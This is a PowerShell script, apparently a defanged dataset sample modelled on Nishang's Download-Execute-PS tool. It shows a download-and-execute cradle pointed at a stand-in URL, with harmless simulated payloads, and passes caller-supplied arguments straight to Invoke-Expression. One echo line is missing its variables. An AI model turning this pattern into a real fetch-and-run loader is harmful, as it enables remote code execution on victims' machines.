function Download-Execute-PS {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ScriptURL,

        [string]$Arguments,

        [switch]$NoDownload
    )

    $artifactDir = Join-Path $PSScriptRoot "artifacts\delivery"
    if (-not (Test-Path $artifactDir)) {
        $null = ni -ItemType Directory -Path $artifactDir -Force
    }

    $client = New-Object Net.WebClient
    $client.Headers["User-Agent"] = "Dataset-Nishang-SafeSample"

    if ($NoDownload) {
        echo "[safe] Simulating in-memory download from $ScriptURL"

        $downloadedScript = @'
function Invoke-FakePayload {
    param([string]$Message = "hello")

    Write-Output "[safe] In-memory payload executed."
    Write-Output "[safe] Payload message: $Message"
}
'@

        iex $downloadedScript

        if ($Arguments) {
            write "[safe] Executing downloaded arguments in memory."
            iex $Arguments
        }
    }
    else {
        $filePath = Join-Path $artifactDir "downloaded-safe-payload.ps1"

        $payloadFile = @'
param([string]$Message = "hello")

Write-Output "[safe] Disk payload executed."
Write-Output "[safe] Payload message: $Message"
'@

        Set-Content -Path $filePath -Value $payloadFile -Encoding UTF8
        echo '[safe] Simulating download to  from '

        if ($Arguments) {
            & $filePath $Arguments
        }
        else {
            & $filePath
        }
    }
}

Download-Execute-PS `
    -ScriptURL "https://example.invalid/payload.ps1" `
    -Arguments "Invoke-FakePayload -Message 'hello'" `
    -NoDownload


